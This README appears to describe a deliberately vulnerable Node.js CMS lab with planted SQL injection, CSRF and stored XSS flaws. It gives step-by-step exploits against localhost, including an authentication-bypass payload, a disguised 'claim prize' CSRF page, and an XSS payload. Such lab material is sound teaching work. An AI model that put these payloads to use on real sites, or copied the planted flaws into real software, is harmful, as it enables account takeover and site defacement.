# Project 3: Vulnerable Node.js CMS

This project is a simple Content Management System (CMS) built with Node.js, Express, and SQLite. It demonstrates a critical login bypass vulnerability and a chained attack combining Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS).

### Vulnerabilities Included:

1.  **Login SQL Injection (CVE-2024-31678 style):** The login form directly concatenates user input into a SQL query, allowing an attacker to bypass authentication.
2.  **CSRF to Edit Content (CVE-2024-24524 style):** The "Edit Page" functionality lacks anti-CSRF tokens, enabling an attacker to trick a logged-in administrator into changing site content.
3.  **Stored XSS (CVE-2024-27757 style):** The application saves page content without sanitization, leading to a Stored XSS vulnerability that can be triggered via the CSRF flaw.

---

### Infrastructure Details

See the `cloud.json` file in this directory for details on the fake cloud deployment environment.

---

### How to Run

**Prerequisites:**
*   Docker
*   Docker Compose

**Instructions:**

1.  Navigate to the `project3` directory in your terminal.
2.  Run the following command to build and start the application:

    ```bash
    docker-compose up --build -d
    ```

3.  The vulnerable CMS will be available at **http://localhost:5004**.
    *   The admin dashboard is at **http://localhost:5004/dashboard**.
    *   The admin login is at **http://localhost:5004/login**.

---

### How to Exploit

#### Exploit 1: SQL Injection Login Bypass

1.  Navigate to the login page: **http://localhost:5004/login**.
2.  In the **Username** field, enter the following SQL injection payload:
    ```
    admin' --
    ```
    (The payload is `admin` followed by a single quote and two dashes. The password field can be left empty.)
3.  Click "Login".
4.  **Result:** The server constructs the query `SELECT * FROM users WHERE username = 'admin' --' AND password = ''`. The `--` comments out the rest of the query, so only the username check is performed. You will be successfully logged in and redirected to the `/dashboard`.

#### Exploit 2 & 3: Chained CSRF + Stored XSS

This attack tricks a logged-in admin into injecting a malicious XSS payload onto the site's home page.

1.  **Login as Admin:** First, use the SQLi exploit above (or log in normally with `admin`/`complexpassword`) to get an active admin session in your browser.

2.  **Create the Attacker's Page:** Create a new HTML file on your local machine named `csrf_xss_attack.html` with the following content. This is the malicious page the admin will be tricked into visiting.

    ```html
    <html>
      <body>
        <h1>Congrats, you've won a prize! Click below!</h1>
        <form id="csrf-form" action="http://localhost:5004/edit/1" method="POST" style="display:none;">
          <input type="hidden" name="title" value="Hacked Home Page" />
          <input type="hidden" name="content" value="<img src=x onerror=alert('XSS_SUCCESS')> This page has been taken over." />
        </form>
        <button onclick="document.getElementById('csrf-form').submit();">Claim Prize</button>
      </body>
    </html>
    ```

3.  **Execute the Attack:** Open `csrf_xss_attack.html` in the **same browser** where you are logged in as admin. Click the "Claim Prize" button.

4.  **Result:**
    *   The form will be submitted to `http://localhost:5004/edit/1` (the home page). Because your browser has the admin's session cookie, the request is authenticated.
    *   The server, lacking CSRF protection, accepts the request.
    *   The malicious `content` (containing the XSS payload) is saved to the database without sanitization.
    *   You will be redirected to the dashboard. Now, visit the public home page: **http://localhost:5004/**.
    *   An alert box with the message `XSS_SUCCESS` will pop up. The attack was successful, and the XSS payload is now stored permanently on the home page, affecting all future visitors.

### To Stop and Clean Up

Run the following command in the `project3` directory:
```bash
docker-compose down --volumes
```